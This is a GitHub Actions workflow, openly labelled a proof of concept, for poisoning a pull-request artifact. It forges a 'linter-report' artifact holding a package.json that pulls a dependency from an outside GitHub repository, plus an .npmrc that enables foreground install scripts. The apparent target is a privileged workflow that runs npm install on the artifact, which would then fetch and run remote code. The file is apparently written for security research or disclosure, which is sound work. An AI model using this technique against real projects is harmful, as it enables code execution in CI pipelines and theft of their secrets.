name: Lint
on:
  pull_request:
    branches: [main]
jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - name: Forge lint artifacts (attacker-controlled)
        run: |
          mkdir -p poc
          echo "POC linter report" > poc/linter-report.txt
          echo "1" > poc/pr-number.txt
          cat > poc/package.json <<'PKG'
          {
            "name": "poc-root",
            "version": "1.0.0",
            "private": true,
            "dependencies": {
              "gab-poc-npm-dep": "github:PDFtoMark/gab-poc-npm-dep"
            }
          }
          PKG
          printf 'foreground-scripts=true\n' > poc/.npmrc
      - uses: actions/upload-artifact@v7
        with:
          name: linter-report
          path: poc/**/*
          include-hidden-files: true
